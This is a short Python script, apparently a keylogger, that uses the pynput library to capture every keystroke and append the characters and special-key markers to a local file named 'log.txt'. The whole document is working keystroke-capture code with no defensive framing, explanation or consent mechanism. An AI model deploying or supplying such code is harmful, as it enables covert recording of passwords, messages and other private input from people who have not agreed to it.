from pynput import keyboard

teclado = keyboard.Key

IGNORAR = {
    teclado.shift,
    teclado.shift_r,
    teclado.ctrl_l,
    teclado.ctrl_r,
    teclado.alt_l,
    teclado.alt_r,
    teclado.caps_lock,
    teclado.cmd_l
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    
    except AttributeError:
        with open("log.txt", "a", encoding='utf-8') as f:
            if key == teclado.space:
                f.write(" ")
            elif key == teclado.enter:
                f.write("\n")
            elif key == teclado.backspace:
                f.write("[<]")
            elif key == teclado.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
    
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()